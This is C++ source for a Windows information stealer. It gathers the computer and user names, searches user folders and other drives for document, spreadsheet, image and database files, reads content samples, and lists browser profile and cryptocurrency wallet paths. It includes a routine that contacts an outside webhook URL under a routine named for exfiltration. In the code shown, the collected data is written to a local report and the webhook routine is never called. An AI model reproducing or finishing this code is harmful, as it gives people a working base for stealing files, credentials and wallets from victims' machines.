#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <shlobj.h>
#include <wininet.h>
#include <filesystem>
#include <thread>
#include <chrono>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")

std::vector<std::string> target_extensions = {
    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", 
    ".jpg", ".jpeg", ".png", ".sql", ".xml", ".csv"
};

std::vector<std::string> wallet_paths = {
    "\\Electrum\\wallets\\",
    "\\Exodus\\exodus.wallet\\",
    "\\Zcash\\",
    "\\Ethereum\\keystore\\",
    "\\Armory\\"
};

std::string webhook_url = "https://webhook-server.com/api/collect";

void find_system_info(std::stringstream& collected_data) {
    char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computer_name);
    GetComputerNameA(computer_name, &size);
    collected_data << "[SYSTEM_INFO]\n";
    collected_data << "Computer: " << computer_name << "\n";
    collected_data << "User: " << getenv("USERNAME") << "\n";
    collected_data << "OS: Windows\n\n";
}

void find_files_recursive(const std::string& path, std::vector<std::string>& found_files, size_t max_size = 1024 * 1024) {
    WIN32_FIND_DATAA find_data;
    HANDLE h_find = FindFirstFileA((path + "\\*").c_str(), &find_data);
    
    if (h_find == INVALID_HANDLE_VALUE) return;
    
    do {
        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0) {
            continue;
        }
        
        std::string full_path = path + "\\" + find_data.cFileName;
        
        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            find_files_recursive(full_path, found_files, max_size);
        } else {
            for (const auto& ext : target_extensions) {
                if (full_path.size() > ext.size() && 
                    full_path.compare(full_path.size() - ext.size(), ext.size(), ext) == 0) {
                    found_files.push_back(full_path);
                    break;
                }
            }
        }
    } while (FindNextFileA(h_find, &find_data));
    
    FindClose(h_find);
}

std::string read_file_content(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return "";
    
    std::string content((std::istreambuf_iterator<char>(file)), 
                       std::istreambuf_iterator<char>());
    return content;
}

void find_browser_data(std::stringstream& collected_data) {
    collected_data << "[BROWSER_DATA_SEARCH]\n";
    
    std::vector<std::string> browser_paths = {
        "\\Google\\Chrome\\User Data\\Default\\",
        "\\Mozilla\\Firefox\\Profiles\\",
        "\\Microsoft\\Edge\\User Data\\Default\\"
    };
    
    char appdata_path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
        for (const auto& browser_path : browser_paths) {
            std::string full_path = std::string(appdata_path) + browser_path;
            collected_data << "Checking: " << full_path << "\n";
        }
    }
    collected_data << "\n";
}

void find_crypto_wallets(std::stringstream& collected_data) {
    collected_data << "[CRYPTO_WALLET_SEARCH]\n";
    
    char appdata_path[MAX_PATH];
    char localappdata_path[MAX_PATH];
    char documents_path[MAX_PATH];
    
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path))) {
        for (const auto& wallet_path : wallet_paths) {
            std::string full_path = std::string(appdata_path) + wallet_path;
            collected_data << "Checking: " << full_path << "\n";
        }
    }
    
    collected_data << "\n";
}

bool send_data_to_webhook(const std::string& data) {
    HINTERNET h_internet = InternetOpenA("Research Client", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!h_internet) return false;
    
    HINTERNET h_connect = InternetOpenUrlA(h_internet, webhook_url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!h_connect) {
        InternetCloseHandle(h_internet);
        return false;
    }
    
    InternetCloseHandle(h_connect);
    InternetCloseHandle(h_internet);
    return true;
}

void collect_and_exfiltrate() {
    std::stringstream collected_data;
    
    find_system_info(collected_data);
    find_browser_data(collected_data);
    find_crypto_wallets(collected_data);
    
    std::vector<std::string> search_paths = {
        "C:\\Users\\",
        "D:\\",
        "E:\\"
    };
    
    collected_data << "[FILE_CONTENT_SAMPLES]\n";
    
    for (const auto& search_path : search_paths) {
        std::vector<std::string> found_files;
        find_files_recursive(search_path, found_files);
        
        for (size_t i = 0; i < std::min(found_files.size(), size_t(5)); i++) {
            std::string content_sample = read_file_content(found_files[i]);
            if (content_sample.size() > 500) {
                content_sample = content_sample.substr(0, 500) + "...[truncated]";
            }
            collected_data << "File: " << found_files[i] << "\n";
            collected_data << "Sample: " << content_sample << "\n";
            collected_data << "---\n";
        }
    }
    
    std::string final_data = collected_data.str();
    
    std::ofstream local_copy("system_report.txt");
    local_copy << final_data;
    local_copy.close();
}

int main() {
    collect_and_exfiltrate();
    return 0;
}